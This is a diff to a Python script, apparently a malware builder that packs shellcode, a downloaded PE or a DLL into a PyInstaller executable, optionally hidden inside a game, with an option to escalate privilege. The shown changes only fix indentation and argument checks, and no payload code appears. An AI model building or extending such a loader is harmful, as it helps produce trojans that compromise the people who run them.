@@ -45,9 +45,9 @@ def create_exe(py_file, game_type, uac, include_pyd=False):
         ]
         if include_pyd:
             shellcd_dir = "shellcd"
-        pyd_files = [f for f in os.listdir(shellcd_dir) if f.endswith(".pyd")]
-        for pyd_file in pyd_files:
-            pyinstaller_command.append(f"--add-binary={os.path.join(shellcd_dir, pyd_file)};{shellcd_dir}")
+            pyd_files = [f for f in os.listdir(shellcd_dir) if f.endswith(".pyd")]
+            for pyd_file in pyd_files:
+                pyinstaller_command.append(f"--add-binary={os.path.join(shellcd_dir, pyd_file)};{shellcd_dir}")
         subprocess.run(pyinstaller_command)
         print("Executable created successfully.")
     except Exception as e:
@@ -85,13 +85,15 @@ def main():
     parser.add_argument("-g", "--game_type", choices=game_types, required=False, help="Name of game to embed into. If not specified, no GUI executable will be generated")
     parser.add_argument("-dll", "--dll",  required=False, help="name of function to run with dll file")
     parser.add_argument("-uac",action="store_true", help="UAC,if not choosen attempts to escalate privilege")
-    parser.add_argument("-sh", "--shellcode", required=True, help="Path to the shellcode file to use instead of downloading PE from URL")
+    parser.add_argument("-sh", "--shellcode", required=False, help="Path to the shellcode file to use instead of downloading PE from URL")
    
     args = parser.parse_args()
+    if args.shellcode and args.game_type:
+        parser.error("Arguments -sh and -g cannot be used together. Please use only one of them.")
     if args.shellcode and args.url:
         parser.error("Arguments -sh and -url cannot be used together. Please use only one of them.")
     if args.shellcode and args.dll:
-        parser.error("Arguments -sh and -url cannot be used together. Please use only one of them.")
+        parser.error("Arguments -sh and -dll cannot be used together. Please use only one of them.")
     if args.shellcode:
     # Execute the command when -sh argument is provided
         # Read the content of paw.py
@@ -278,7 +280,7 @@ def main():
 # Define the start and end markers for the desired section in 'paw.py'
     start_marker = "# Start of desired section"
     end_marker = "# End of desired section"
-
+    
 # Find the positions of the start and end markers in 'paw.py'
     start_index = paw_contents.find(start_marker)
     end_index = paw_contents.find(end_marker)
